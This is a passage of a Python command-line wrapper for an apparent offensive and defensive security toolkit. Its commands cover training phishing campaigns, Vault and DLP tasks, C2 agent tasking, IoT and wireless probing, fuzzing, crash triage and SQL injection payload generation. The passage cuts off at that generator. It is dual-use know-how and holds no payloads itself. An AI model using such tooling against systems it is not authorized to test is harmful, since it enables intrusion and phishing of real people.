        if campaign.status not in ['draft', 'paused']:
            print(f"⚠️  Campaign status is '{campaign.status}'. Continue? (yes/no): ", end='')
            if input().lower() != 'yes':
                print("Cancelled")
                return

        # Get targets
        targets = manager.get_campaign_targets(campaign_id)

        if not targets:
            print("❌ No targets found for campaign")
            return

        print(f"\n📧 Sending Campaign: {campaign.name}")
        print(f"   Template: {campaign.template_id}")
        print(f"   Targets: {len(targets)}")
        if dry_run:
            print("   Mode: DRY RUN (no emails will be sent)")

        # Initialize sender
        sender = EmailSender(smtp_host='localhost', smtp_port=1025)

        # Test SMTP connection
        if not dry_run:
            print("\nTesting SMTP connection...")
            if not sender.test_connection():
                print("\n❌ SMTP connection failed. Is mailhog running?")
                print("   Start with: docker run -p 1025:1025 -p 8025:8025 mailhog/mailhog")
                return
            print("✅ SMTP connected\n")

        # Send emails
        results = sender.send_campaign_emails(
            campaign_id=campaign_id,
            targets=targets,
            template_id=campaign.template_id,
            config=campaign.config,
            delay_seconds=0.5,
            dry_run=dry_run
        )

        # Update campaign status and record sends
        if not dry_run:
            for target in targets:
                if target['recipient_email'] not in results['failures']:
                    manager.record_email_sent(target['id'])

            if campaign.status == 'draft':
                manager.update_campaign_status(campaign_id, 'active')

        # Print results
        print(f"\n📊 Results:")
        print(f"   Sent: {results['sent']}")
        print(f"   Failed: {results['failed']}")

        if results['failures']:
            print(f"\n   Failed addresses:")
            for email in results['failures']:
                print(f"     • {email}")

    def phish_report(self, campaign_id: str):
        """View campaign report."""
        from education.phishing.report_generator import ReportGenerator

        generator = ReportGenerator()
        generator.print_campaign_report(campaign_id)

    def phish_export(self, campaign_id: str, output: Optional[str] = None):
        """Export campaign report to JSON."""
        from education.phishing.report_generator import ReportGenerator

        generator = ReportGenerator()

        try:
            report_path = generator.export_json_report(campaign_id, output)
            print(f"\n✅ Report exported: {report_path}")
        except Exception as e:
            print(f"❌ Failed to export report: {e}")

    def phish_start_tracker(self, host: str = '127.0.0.1', port: int = 5555):
        """Start click tracking server."""
        from education.phishing.click_tracker import start_server

        print("\n⚠️  Make sure campaigns have been created first!")
        print("   Tracker will record clicks and show education pages.\n")

        start_server(host=host, port=port, debug=True)

    # Phase 6: Vault

    def vault_get(self, path: str, version: Optional[int] = None, mock: bool = False):
        """Get a secret from Vault."""
        from education.vault.vault_client import get_vault_client

        try:
            vault = get_vault_client(mock=mock)
            secret = vault.get_secret(path, version=version)

            if secret:
                print(f"\n🔐 Secret at '{path}':")
                import json
                print(json.dumps(secret, indent=2))
            else:
                print(f"❌ Secret not found: {path}")
        except Exception as e:
            print(f"❌ Error: {e}")

    def vault_set(self, path: str, data: str, mock: bool = False):
        """Set a secret in Vault."""
        from education.vault.vault_client import get_vault_client
        import json

        try:
            vault = get_vault_client(mock=mock)
            secret_data = json.loads(data)

            if vault.set_secret(path, secret_data):
                print(f"✅ Secret stored at '{path}'")
            else:
                print(f"❌ Failed to store secret")
        except json.JSONDecodeError:
            print("❌ Invalid JSON data. Use format: '{\"key\": \"value\"}'")
        except Exception as e:
            print(f"❌ Error: {e}")

    def vault_list(self, path: str = "", mock: bool = False):
        """List secrets in Vault."""
        from education.vault.vault_client import get_vault_client

        try:
            vault = get_vault_client(mock=mock)
            secrets = vault.list_secrets(path)

            if secrets:
                print(f"\n📋 Secrets at '{path or '/'}':")
                for secret in secrets:
                    print(f"   • {secret}")
            else:
                print(f"No secrets found at '{path or '/'}'")
        except Exception as e:
            print(f"❌ Error: {e}")

    def vault_delete(self, path: str, mock: bool = False):
        """Delete a secret from Vault."""
        from education.vault.vault_client import get_vault_client

        try:
            vault = get_vault_client(mock=mock)

            if vault.delete_secret(path):
                print(f"✅ Secret deleted: {path}")
            else:
                print(f"❌ Failed to delete secret")
        except Exception as e:
            print(f"❌ Error: {e}")

    def vault_rotate(self, policy_id: str, force: bool = False, mock: bool = False):
        """Rotate a secret using a rotation policy."""
        from education.vault.vault_client import get_vault_client
        from education.vault.rotation_policies import RotationManager, RotationStatus

        try:
            vault = get_vault_client(mock=mock)
            manager = RotationManager(vault)

            log = manager.rotate_secret(policy_id, force=force)

            if log.status == RotationStatus.SUCCESS.value:
                print(f"✅ Secret rotated: {log.secret_path}")
                print(f"   Old version: {log.old_version}")
                print(f"   New version: {log.new_version}")
            elif log.status == RotationStatus.SKIPPED.value:
                print(f"⏭️  Rotation skipped: {log.error_message}")
            else:
                print(f"❌ Rotation failed: {log.error_message}")
        except Exception as e:
            print(f"❌ Error: {e}")

    def vault_scan(self, target: str, output: Optional[str] = None):
        """Scan for hardcoded secrets in code."""
        from education.vault.secret_scanner import SecretScanner

        scanner = SecretScanner()

        print(f"🔍 Scanning {target} for hardcoded secrets...")
        findings = scanner.scan(target)

        report = scanner.generate_report(findings)

        # Display summary
        print(f"\n🥷 Secret Scan Results\n")
        print(f"Total findings: {report['total_findings']}")

        if report['total_findings'] > 0:
            print(f"\nBy confidence:")
            for confidence in ["high", "medium", "low"]:
                count = report['by_confidence'].get(confidence, 0)
                if count > 0:
                    emoji = {"high": "🔴", "medium": "🟡", "low": "🔵"}[confidence]
                    print(f"  {emoji} {confidence}: {count}")

            print(f"\n📋 Top Secret Types:")
            for secret_type, count in sorted(report['by_type'].items(), key=lambda x: -x[1])[:5]:
                print(f"  • {secret_type}: {count}")

            # Show high-confidence findings
            high_conf = [f for f in findings if f.confidence == "high"]
            if high_conf:
                print(f"\n🔴 High Confidence Findings ({len(high_conf)}):\n")
                for finding in high_conf[:10]:
                    print(f"• {finding.secret_type}")
                    print(f"  {finding.file_path}:{finding.line_number}")
                    print(f"  Match: {finding.matched_text[:60]}...")
                    print()

                if len(high_conf) > 10:
                    print(f"... and {len(high_conf) - 10} more high-confidence findings")

        else:
            print("\n✅ No secrets found!")

        # Save report if output specified
        if output:
            import json
            with open(output, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"\n📄 Full report saved to: {output}")

    def vault_health(self, mock: bool = False):
        """Check Vault server health."""
        from education.vault.vault_client import get_vault_client

        print_banner(VAULT_BANNER, Colors.OKCYAN)

        try:
            vault = get_vault_client(mock=mock)
            health = vault.health_check()

            print(f"{Colors.BOLD}Health Check{Colors.ENDC}:")
            print(f"   URL: {vault.url}")
            print(f"   Healthy: {'✅' if health['healthy'] else '❌'}")
            print(f"   Initialized: {health['initialized']}")
            print(f"   Sealed: {health['sealed']}")
            if health.get("version"):
                print(f"   Version: {health['version']}")
            if health.get("error"):
                print(f"   Error: {health['error']}")

            if mock:
                print(f"\n⚠️  Using mock Vault client (no real server)")
        except Exception as e:
            print(f"❌ Error: {e}")

    def vault_policies_list(self, mock: bool = False):
        """List rotation policies."""
        from education.vault.vault_client import get_vault_client
        from education.vault.rotation_policies import RotationManager

        try:
            vault = get_vault_client(mock=mock)
            manager = RotationManager(vault)

            policies = manager.list_policies()

            if not policies:
                print("No rotation policies configured")
                return

            print(f"\n🔐 Rotation Policies ({len(policies)}):\n")
            for policy in policies:
                status = "✅" if policy.enabled else "❌"
                print(f"{status} {policy.policy_id}")
                print(f"   Secret: {policy.secret_path}")
                print(f"   Type: {policy.rotation_type}")
                if policy.rotation_interval_days:
                    print(f"   Interval: {policy.rotation_interval_days} days")
                if policy.last_rotated:
                    print(f"   Last rotated: {policy.last_rotated}")
                if policy.next_rotation:
                    print(f"   Next rotation: {policy.next_rotation}")
                print()
        except Exception as e:
            print(f"❌ Error: {e}")

    def vault_policies_check(self, mock: bool = False):
        """Check for due rotations."""
        from education.vault.vault_client import get_vault_client
        from education.vault.rotation_policies import RotationManager

        try:
            vault = get_vault_client(mock=mock)
            manager = RotationManager(vault)

            due = manager.check_due_rotations()

            if not due:
                print("✅ No rotations due")
                return

            print(f"\n⚠️  {len(due)} rotation(s) due:\n")
            for policy in due:
                print(f"• {policy.policy_id}")
                print(f"  Secret: {policy.secret_path}")
                print(f"  Next rotation: {policy.next_rotation}")
                print()
        except Exception as e:
            print(f"❌ Error: {e}")

    # Phase 6: DLP System

    def dlp_scan(self, target: str, scan_type: str = "file"):
        """Scan target for PII violations."""
        from education.dlp.content_inspector import ContentInspector

        print_banner(DLP_BANNER, Colors.WARNING)

        inspector = ContentInspector()

        print(f"🔍 Scanning {target} for sensitive data...")

        if scan_type == "file":
            import os
            if os.path.isfile(target):
                violation = inspector.inspect_file(target)
                if violation:
                    self._print_violation(violation)
                else:
                    print("✅ No PII detected")
            elif os.path.isdir(target):
                violations = inspector.inspect_directory(target, recursive=True)
                print(f"\n📊 Scan complete: {len(violations)} violations found")
                for v in violations[:10]:
                    self._print_violation(v)
                if len(violations) > 10:
                    print(f"\n... and {len(violations) - 10} more violations")
            else:
                print(f"❌ Target not found: {target}")

        elif scan_type == "git":
            violation = inspector.inspect_git_staged(target)
            if violation:
                self._print_violation(violation)
            else:
                print("✅ No PII detected in staged changes")

        elif scan_type == "api":
            import json
            try:
                with open(target, 'r') as f:
                    payload = json.load(f)
                violation = inspector.inspect_api_request("/api/test", payload)
                if violation:
                    self._print_violation(violation)
                else:
                    print("✅ No PII detected in payload")
            except Exception as e:
                print(f"❌ Error reading payload: {e}")

    def dlp_violations_list(self, severity: Optional[str] = None):
        """List DLP violations."""
        from education.dlp.content_inspector import ContentInspector

        inspector = ContentInspector()
        violations = inspector.get_violations(severity=severity)

        if not violations:
            print("No violations found")
            return

        print(f"\n📋 DLP Violations ({len(violations)}):\n")
        for v in violations:
            severity_emoji = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🔵'}.get(v.severity, '⚪')
            print(f"{severity_emoji} {v.violation_id}")
            print(f"   Source: {v.source} - {v.source_path}")
            print(f"   Severity: {v.severity.upper()}")
            print(f"   PII Matches: {len(v.pii_matches)}")
            if v.action_taken:
                print(f"   Action: {v.action_taken.upper()}")
            print()

    def dlp_violations_show(self, violation_id: str):
        """Show detailed violation information."""
        from education.dlp.content_inspector import ContentInspector
        from pathlib import Path

        inspector = ContentInspector()
        violations = inspector.get_violations()

        violation = next((v for v in violations if v.violation_id == violation_id), None)

        if not violation:
            print(f"❌ Violation not found: {violation_id}")
            return

        self._print_violation(violation, detailed=True)

    def dlp_violations_clear(self):
        """Clear all violations."""
        from education.dlp.content_inspector import ContentInspector

        consent = input("Clear all DLP violations? (yes/no): ")
        if consent.lower() != "yes":
            print("❌ Cancelled")
            return

        inspector = ContentInspector()
        inspector.clear_violations()
        print("✅ All violations cleared")

    def dlp_policies_list(self):
        """List DLP policies."""
        from education.dlp.policy_engine import PolicyEngine

        engine = PolicyEngine()
        policies = engine.list_policies()

        print("\n🛡️  DLP Policies:\n")
        for policy in policies:
            status = "✅" if policy['enabled'] else "❌"
            print(f"{status} {policy['id']}")
            print(f"   {policy['name']}")
            print(f"   Action: {policy['action'].upper()}")
            print(f"   Threshold: {policy['severity_threshold']}")
            print(f"   PII Types: {', '.join(policy['pii_types'][:5])}")
            if len(policy['pii_types']) > 5:
                print(f"      ... and {len(policy['pii_types']) - 5} more")
            print()

    def dlp_policies_enable(self, policy_id: str):
        """Enable a DLP policy."""
        from education.dlp.policy_engine import PolicyEngine

        engine = PolicyEngine()
        if engine.enable_policy(policy_id):
            print(f"✅ Policy enabled: {policy_id}")
        else:
            print(f"❌ Policy not found: {policy_id}")

    def dlp_policies_disable(self, policy_id: str):
        """Disable a DLP policy."""
        from education.dlp.policy_engine import PolicyEngine

        engine = PolicyEngine()
        if engine.disable_policy(policy_id):
            print(f"✅ Policy disabled: {policy_id}")
        else:
            print(f"❌ Policy not found: {policy_id}")

    def dlp_monitor_file(self, paths: Optional[List[str]] = None):
        """Start file system DLP monitor."""
        from education.dlp.monitors.file_monitor import FileMonitor

        monitor = FileMonitor(watch_paths=paths)
        monitor.start()

    def dlp_monitor_git(self, action: str = "check", repo_path: str = "."):
        """Git DLP monitoring."""
        from education.dlp.monitors.git_monitor import GitMonitor

        monitor = GitMonitor(repo_path=repo_path)

        if action == "check":
            violation = monitor.check_staged_changes()
            if violation and violation.action_taken == 'block':
                sys.exit(1)
        elif action == "install":
            monitor.install_pre_commit_hook()
        else:
            print(f"❌ Unknown action: {action}")
            print("   Available: check, install")

    def dlp_monitor_api(self, port: int = 5050):
        """Start API DLP monitor demo."""
        from education.dlp.monitors.api_monitor import create_demo_app

        print("🔍 Starting DLP-enabled demo API server")
        print(f"Listening on http://localhost:{port}")
        print("\nDemo endpoints:")
        print("  POST /api/users - Create user (test PII in request)")
        print("  GET /api/users/<id> - Get user (test PII in response)")
        print("  GET /api/stats - View DLP stats")
        print("\nPress Ctrl+C to stop\n")

        app = create_demo_app()
        app.run(host='0.0.0.0', port=port, debug=False)

    def _print_violation(self, violation, detailed: bool = False):
        """Print violation details."""
        severity_emoji = {'critical': '🔴', 'high': '🟠', 'medium': '🟡', 'low': '🔵'}.get(violation.severity, '⚪')

        print(f"\n{severity_emoji} DLP Violation: {violation.violation_id}")
        print(f"   Source: {violation.source}")
        print(f"   Path: {violation.source_path}")
        print(f"   Severity: {violation.severity.upper()}")
        print(f"   Timestamp: {violation.timestamp}")

        if violation.action_taken:
            print(f"   Action: {violation.action_taken.upper()}")

        print(f"\n   PII Detected ({len(violation.pii_matches)}):")
        for match in violation.pii_matches[:10 if not detailed else None]:
            print(f"   • {match['pii_type']}: {match['value']}")
            if match.get('line_number'):
                print(f"     Line {match['line_number']} (confidence: {match['confidence']:.2f})")
            elif detailed and match.get('context'):
                print(f"     Context: {match['context'][:60]}...")

        if not detailed and len(violation.pii_matches) > 10:
            print(f"   ... and {len(violation.pii_matches) - 10} more PII matches")

        print()

    # Phase 6: Threat Hunting

    def hunt_analyze(self, log_file: str, analysis_type: str = "auto"):
        """Analyze logs for threats."""
        from intelligence.hunting.hunt_cli import HuntCLI
        import json

        print_banner(HUNT_BANNER, Colors.FAIL)

        cli = HuntCLI()
        findings = cli.analyze_logs(log_file, analysis_type)

        # Save findings
        if findings:
            findings_file = "hunt_findings.json"
            with open(findings_file, 'w') as f:
                json.dump(findings, f, indent=2)
            print(f"\nFindings saved to {findings_file}")

            # Prompt for report
            generate = input("\nGenerate threat report? (yes/no): ")
            if generate.lower() == "yes":
                format_choice = input("Format (markdown/html/json): ") or "markdown"
                cli.generate_report(findings, format_choice)

    def hunt_ioc(self, indicator: str):
        """Check IoC against database."""
        from intelligence.hunting.hunt_cli import HuntCLI

        cli = HuntCLI()
        cli.check_ioc(indicator)

    def hunt_ioc_import(self, feed_file: str, feed_name: str = "custom"):
        """Import IoCs from file."""
        from intelligence.hunting.hunt_cli import HuntCLI

        cli = HuntCLI()
        cli.import_iocs(feed_file, feed_name)

    def hunt_report(self, findings_file: str, output_format: str = "markdown"):
        """Generate threat hunting report."""
        from intelligence.hunting.hunt_cli import HuntCLI
        import json

        cli = HuntCLI()

        try:
            with open(findings_file, 'r') as f:
                findings = json.load(f)

            cli.generate_report(findings, output_format)

        except Exception as e:
            print(f"❌ Error: {e}")

    def hunt_stats(self):
        """Show threat hunting statistics."""
        from intelligence.hunting.hunt_cli import HuntCLI

        cli = HuntCLI()
        cli.show_stats()

    # Phase 7: Mobile + C2 Commands
    def mobile_static(self, target: str, platform: str = 'android'):
        """Run static analysis on mobile app"""
        if platform == 'android':
            from mobile.static.apk_analyzer import APKAnalyzer
            analyzer = APKAnalyzer()

            print(f"[*] Analyzing {target}")
            result = analyzer.decompile(Path(target))

            if not result.success:
                print(f"[!] Decompilation failed: {result.error}")
                return

            print(f"[+] Decompiled to: {result.output_dir}")

            # Parse manifest
            manifest_path = result.output_dir / "AndroidManifest.xml"
            if manifest_path.exists():
                manifest = analyzer.parse_manifest(manifest_path)

                print(f"\n[*] Package: {manifest.package_name}")
                print(f"[*] Min SDK: {manifest.min_sdk_version}")
                print(f"[*] Debuggable: {manifest.debuggable}")
                print(f"[*] Permissions: {len(manifest.permissions)}")

                for perm in manifest.permissions[:10]:
                    print(f"    - {perm}")

            # Find secrets
            print("\n[*] Scanning for hardcoded secrets...")
            secrets = analyzer.find_secrets(result.output_dir)

            if secrets:
                print(f"[!] Found {len(secrets)} secrets:")
                for secret in secrets[:10]:
                    print(f"    [{secret.severity}] {secret.type} in {secret.file_path.name}:{secret.line_number}")
            else:
                print("[+] No hardcoded secrets found")

        elif platform == 'ios':
            from mobile.static.ipa_analyzer import IPAAnalyzer
            analyzer = IPAAnalyzer()

            print(f"[*] Extracting {target}")
            result = analyzer.extract(Path(target))

            if not result.success:
                print(f"[!] Extraction failed: {result.error}")
                return

            print(f"[+] Extracted to: {result.app_dir}")

            # Parse plist
            plist_path = result.app_dir / "Info.plist"
            if plist_path.exists():
                plist = analyzer.parse_plist(plist_path)

                print(f"\n[*] Bundle ID: {plist.bundle_id}")
                print(f"[*] Version: {plist.version}")
                print(f"[*] ATS Exceptions: {plist.ats_exceptions}")
                print(f"[*] Permissions: {len(plist.permissions)}")

                for key, desc in plist.permissions.items():
                    print(f"    - {key}: {desc}")

    def c2_agent_list(self):
        """List C2 agents"""
        from redteam.c2.commander import C2Commander
        commander = C2Commander()

        agents = commander.list_agents()

        if not agents:
            print("No agents registered")
            return

        print(f"\n[*] {len(agents)} agents:")
        for agent in agents:
            status = "🟢" if agent.last_seen > time.time() - 60 else "🔴"
            print(f"{status} {agent.id} - {agent.hostname} ({agent.platform})")

    def c2_task_send(self, agent_id: str, command: str, args: str = ""):
        """Send task to agent"""
        from redteam.c2.commander import C2Commander
        commander = C2Commander()

        task_id = commander.send_task(agent_id, command, args)
        print(f"[+] Task {task_id} sent to {agent_id}")

    def redteam_campaign_create(self, name: str, target: str, mode: str, template: str = "mobile-test"):
        """Create campaign"""
        from redteam.campaigns.orchestrator import CampaignOrchestrator
        orchestrator = CampaignOrchestrator()

        campaign_id = orchestrator.create_campaign(name, target, mode, template)
        print(f"[+] Campaign '{name}' created with ID: {campaign_id}")

    def redteam_campaign_run(self, campaign_id: str):
        """Run campaign"""
        from redteam.campaigns.orchestrator import CampaignOrchestrator
        orchestrator = CampaignOrchestrator()

        orchestrator.run_campaign(campaign_id)

    # Phase 8: Wireless + IoT Commands

    def wireless_wifi_scan(self):
        """Scan for WiFi networks"""
        from wireless.wifi.wifi_scanner import WiFiScanner

        scanner = WiFiScanner()
        networks = scanner.scan_networks()

        if not networks:
            print("No WiFi networks found (or no wireless interface detected)")
            return

        print(f"\n[*] Found {len(networks)} networks:\n")
        for net in networks:
            security_emoji = "🔒" if "WPA" in net.encryption else "🔓"
            print(f"{security_emoji} {net.ssid}")
            print(f"   BSSID: {net.bssid}")
            print(f"   Channel: {net.channel} | Signal: {net.signal_strength} dBm")
            print(f"   Encryption: {net.encryption}")
            print()

    def wireless_ble_scan(self, timeout: int = 10):
        """Scan for BLE devices"""
        from wireless.bluetooth.ble_scanner import BLEScanner

        scanner = BLEScanner()
        print(f"[*] Scanning for BLE devices (timeout: {timeout}s)...")
        devices = scanner.scan_devices(timeout=timeout)

        if not devices:
            print("No BLE devices found")
            return

        print(f"\n[*] Found {len(devices)} devices:\n")
        for dev in devices:
            print(f"📱 {dev.name or 'Unknown'}")
            print(f"   Address: {dev.address}")
            if dev.rssi:
                print(f"   RSSI: {dev.rssi} dBm")
            if dev.manufacturer:
                print(f"   Manufacturer: {dev.manufacturer}")
            print()

    def wireless_wifi_analyze(self, pcap_file: str):
        """Analyze WiFi pcap for security issues"""
        from wireless.wifi.wifi_scanner import WiFiScanner
        from wireless.wifi.deauth_detector import DeauthDetector
        from pathlib import Path

        pcap_path = Path(pcap_file)
        if not pcap_path.exists():
            print(f"❌ File not found: {pcap_file}")
            return

        # Check for WPA handshake
        scanner = WiFiScanner()
        has_handshake = scanner.detect_wpa_handshake(pcap_path)
        print(f"\n[*] WPA Handshake: {'✅ Detected' if has_handshake else '❌ Not found'}")

        # Check for deauth attacks
        detector = DeauthDetector()
        result = detector.detect_deauth_frames(pcap_path)

        severity_emoji = {'low': '🟢', 'medium': '🟡', 'high': '🔴'}.get(result.get('severity', 'low'), '⚪')
        print(f"\n[*] Deauth Frames: {result['deauth_count']}")
        print(f"{severity_emoji} Suspicious: {'Yes' if result['suspicious'] else 'No'} (Severity: {result['severity']})")

    def iot_scan(self, network: str, timeout: int = 30):
        """Scan network for IoT devices"""
        from iot.device.scanner import IoTScanner

        scanner = IoTScanner()
        print(f"[*] Scanning {network} for IoT devices...")
        devices = scanner.scan_network(network, timeout=timeout)

        if not devices:
            print("No devices found")
            return

        print(f"\n[*] Found {len(devices)} devices:\n")
        for dev in devices:
            print(f"🖥️  {dev.ip}")
            if dev.hostname:
                print(f"   Hostname: {dev.hostname}")
            if dev.mac:
                print(f"   MAC: {dev.mac}")
            if dev.vendor:
                print(f"   Vendor: {dev.vendor}")
            print()

    def iot_mqtt_probe(self, host: str, port: int = 1883, timeout: int = 5):
        """Probe MQTT broker"""
        from iot.protocol.mqtt_analyzer import MQTTAnalyzer

        analyzer = MQTTAnalyzer()
        print(f"[*] Probing MQTT broker at {host}:{port}...")

        result = analyzer.probe_broker(host, port, timeout)

        status_emoji = "✅" if result['accessible'] else "❌"
        print(f"\n{status_emoji} Broker: {'Accessible' if result['accessible'] else 'Not accessible'}")

        if result['accessible']:
            anon_emoji = "⚠️" if result['anonymous_allowed'] else "🔒"
            print(f"{anon_emoji} Anonymous Access: {'Allowed' if result['anonymous_allowed'] else 'Denied'}")

            # Try to enumerate topics
            topics = analyzer.enumerate_topics(host, port, timeout)
            if topics:
                print(f"\n[*] Discovered Topics ({len(topics)}):")
                for topic in topics[:10]:
                    print(f"   • {topic}")

    def iot_coap_probe(self, host: str, port: int = 5683, timeout: int = 5):
        """Probe CoAP server"""
        from iot.protocol.coap_analyzer import CoAPAnalyzer

        analyzer = CoAPAnalyzer()
        print(f"[*] Probing CoAP server at {host}:{port}...")

        result = analyzer.probe_server(host, port, timeout)

        status_emoji = "✅" if result['accessible'] else "❌"
        print(f"\n{status_emoji} Server: {'Accessible' if result['accessible'] else 'Not accessible'}")
        print(f"   Protocol: {result['protocol']}")

        if result['accessible']:
            anon_emoji = "⚠️" if result['anonymous_allowed'] else "🔒"
            print(f"{anon_emoji} Anonymous Access: {'Allowed' if result['anonymous_allowed'] else 'Denied'}")

            # Try to discover resources
            resources = analyzer.discover_resources(host, port, timeout)
            if resources:
                print(f"\n[*] Discovered Resources ({len(resources)}):")
                for resource in resources[:10]:
                    print(f"   • {resource}")

    def iot_firmware_extract(self, firmware_file: str):
        """Extract IoT firmware"""
        from iot.firmware.extractor import FirmwareExtractor
        from pathlib import Path

        extractor = FirmwareExtractor()
        firmware_path = Path(firmware_file)

        if not firmware_path.exists():
            print(f"❌ File not found: {firmware_file}")
            return

        print(f"[*] Extracting firmware: {firmware_file}")
        result = extractor.extract_firmware(firmware_path)

        if not result['success']:
            print(f"❌ Extraction failed: {result.get('error', 'Unknown error')}")
            return

        print(f"✅ Extraction successful")
        print(f"   Output: {result['output_dir']}")

        if result['filesystems']:
            print(f"\n[*] Detected Filesystems ({len(result['filesystems'])}):")
            for fs in result['filesystems']:
                print(f"   • {fs}")

    def iot_firmware_scan(self, firmware_path: str):
        """Scan firmware for secrets"""
        from iot.firmware.extractor import FirmwareExtractor
        from pathlib import Path

        extractor = FirmwareExtractor()
        path = Path(firmware_path)

        if not path.exists():
            print(f"❌ Path not found: {firmware_path}")
            return

        print(f"[*] Scanning {firmware_path} for secrets...")
        secrets = extractor.scan_secrets(path)

        if not secrets:
            print("✅ No secrets found")
            return

        print(f"\n⚠️  Found {len(secrets)} secrets:\n")
        for secret in secrets[:20]:
            print(f"  [{secret['type']}] {secret['match']}")

        if len(secrets) > 20:
            print(f"\n... and {len(secrets) - 20} more secrets")

    # Phase 9A: Fuzzing Framework

    def fuzz_binary(self, binary_path: str, corpus_dir: str, timeout: int = 3600):
        """Fuzz a binary application."""
        from exploits.fuzzer import Fuzzer
        from pathlib import Path

        print("\n🔬 Binary Fuzzing")
        print("=" * 60)

        binary = Path(binary_path)
        corpus = Path(corpus_dir)

        # Validate inputs
        if not binary.exists():
            print(f"❌ Binary not found: {binary_path}")
            return

        if not corpus.exists():
            print(f"❌ Corpus directory not found: {corpus_dir}")
            return

        print(f"\n[*] Target Binary: {binary_path}")
        print(f"[*] Corpus Directory: {corpus_dir}")
        print(f"[*] Timeout: {timeout}s")

        # Count corpus seeds
        seed_count = len(list(corpus.glob('*')))
        print(f"[*] Seed Files: {seed_count}")

        fuzzer = Fuzzer()

        # Check if AFL++ is available
        if fuzzer.binary_fuzzer.check_afl_available():
            print("\n✅ AFL++ detected - using AFL++ fuzzer")
        else:
            print("\n⚠️  AFL++ not available - using Python-based fuzzer")
            print("   (Install AFL++ for better performance: apt install afl++)")

        print(f"\n🚀 Starting fuzzing (timeout: {timeout}s)...")
        print("   Press Ctrl+C to stop early\n")

        try:
            result = fuzzer.fuzz_binary(binary_path, corpus_dir, timeout)

            print("\n📊 Fuzzing Results:")
            print(f"   Method: {result['method']}")
            print(f"   Iterations: {result['iterations']:,}")
            print(f"   Total Crashes: {result['crashes']}")
            print(f"   Unique Crashes: {result['unique_crashes']}")
            print(f"   Elapsed Time: {result['elapsed_time']:.2f}s")
            print(f"   Status: {result['status']}")

            if result.get('crash_dir') and result['crashes'] > 0:
                print(f"\n💥 Crashes saved to: {result['crash_dir']}")
                print(f"\nAnalyze crashes with:")
                print(f"   akali fuzz analyze {result['crash_dir']}")

        except KeyboardInterrupt:
            print("\n\n⚠️  Fuzzing interrupted by user")
        except Exception as e:
            print(f"\n❌ Fuzzing error: {e}")

    def fuzz_network(
        self,
        target: str,
        port: int,
        protocol: str = 'tcp',
        iterations: int = 1000,
        corpus_dir: str = None
    ):
        """Fuzz a network service."""
        from exploits.fuzzer import Fuzzer

        print("\n🌐 Network Fuzzing")
        print("=" * 60)

        print(f"\n[*] Target: {target}:{port}")
        print(f"[*] Protocol: {protocol.upper()}")
        print(f"[*] Iterations: {iterations:,}")

        if corpus_dir:
            print(f"[*] Using corpus: {corpus_dir}")

        print("\n⚠️  WARNING: Network fuzzing may cause service disruption")
        print("   Only fuzz systems you own or have permission to test")

        consent = input("\nDo you have authorization to fuzz this target? (yes/no): ")
        if consent.lower() != "yes":
            print("❌ Fuzzing cancelled. Authorization required.")
            return

        fuzzer = Fuzzer()

        print(f"\n🚀 Starting {protocol.upper()} fuzzing...")

        try:
            result = fuzzer.fuzz_network(
                target=target,
                port=port,
                protocol=protocol,
                iterations=iterations,
                corpus_dir=corpus_dir
            )

            print("\n📊 Fuzzing Results:")
            print(f"   Protocol: {result['protocol'].upper()}")
            print(f"   Iterations: {result['iterations']:,}")

            if 'responses' in result:
                print(f"   Responses: {len(result['responses'])}")
                print(f"   Unique Responses: {result.get('unique_responses', 0)}")

            if 'anomalies' in result and result['anomalies']:
                print(f"\n⚠️  Anomalies Detected: {len(result['anomalies'])}")
                for i, anomaly in enumerate(result['anomalies'][:5], 1):
                    print(f"   {i}. {anomaly['type']}: {anomaly}")

                if len(result['anomalies']) > 5:
                    print(f"   ... and {len(result['anomalies']) - 5} more anomalies")

            print(f"\n   Errors: {result.get('errors', 0)}")

            if result.get('errors', 0) > iterations * 0.5:
                print("\n⚠️  High error rate detected - check target connectivity")

        except KeyboardInterrupt:
            print("\n\n⚠️  Fuzzing interrupted by user")
        except Exception as e:
            print(f"\n❌ Fuzzing error: {e}")

    def fuzz_analyze(self, crash_dir: str, report: bool = False):
        """Analyze crash files for exploitability."""
        from exploits.fuzzer import CrashAnalyzer
        from pathlib import Path

        print("\n🔍 Crash Analysis")
        print("=" * 60)

        crash_path = Path(crash_dir)

        if not crash_path.exists():
            print(f"❌ Crash directory not found: {crash_dir}")
            return

        # Count crash files
        crash_files = list(crash_path.glob('*'))
        if not crash_files:
            print(f"\n✅ No crash files found in {crash_dir}")
            return

        print(f"\n[*] Analyzing {len(crash_files)} crash files...")

        analyzer = CrashAnalyzer()
        results = analyzer.analyze_directory(crash_dir)

        if not results:
            print("✅ No crashes to analyze")
            return

        # Generate report
        report_data = analyzer.generate_report(results)

        print("\n📊 Analysis Summary:")
        print(f"   Total Crashes: {report_data['total_crashes']}")
        print(f"   Unique Crashes: {report_data['unique_crashes']}")
        print(f"   Interesting Crashes: {report_data['interesting_crashes']}")

        if report_data['by_exploitability']:
            print("\n🎯 By Exploitability:")
            for level in ['high', 'medium', 'low', 'unknown']:
                count = report_data['by_exploitability'].get(level, 0)
                if count > 0:
                    emoji = {'high': '🔴', 'medium': '🟡', 'low': '🔵', 'unknown': '⚪'}
                    print(f"   {emoji[level]} {level.upper()}: {count}")

        if report_data['by_crash_type']:
            print("\n🐛 By Crash Type:")
            for crash_type, count in sorted(report_data['by_crash_type'].items(), key=lambda x: x[1], reverse=True):
                print(f"   • {crash_type}: {count}")

        # Show interesting crashes
        interesting = analyzer.filter_interesting(results)
        if interesting:
            print(f"\n🔥 Top Interesting Crashes:")
            prioritized = analyzer.prioritize_crashes(interesting)

            for i, crash in enumerate(prioritized[:5], 1):
                print(f"\n   {i}. {Path(crash['file']).name}")
                print(f"      Exploitability: {crash['exploitability'].upper()}")
                print(f"      Crash Type: {crash['crash_type']}")
                print(f"      Size: {crash['size']} bytes")
                print(f"      Hash: {crash['hash'][:16]}...")

            if len(prioritized) > 5:
                print(f"\n   ... and {len(prioritized) - 5} more interesting crashes")

        if report:
            # Save detailed report
            import json
            report_path = Path(crash_dir) / "analysis_report.json"
            report_path.write_text(json.dumps({
                'summary': report_data,
                'crashes': results
            }, indent=2))

            print(f"\n📄 Detailed report saved to: {report_path}")

    # Phase 9A: Exploit Payload Generation

    def exploit_generate_sqli(self, db: str, payload_type: str, encoding: Optional[str] = None):
        """Generate SQL injection payloads."""
        from exploits.generator.payload_builder import PayloadBuilder

        builder = PayloadBuilder()

        print(f"\n🥷 Generating {db} {payload_type} SQL injection payloads...\n")

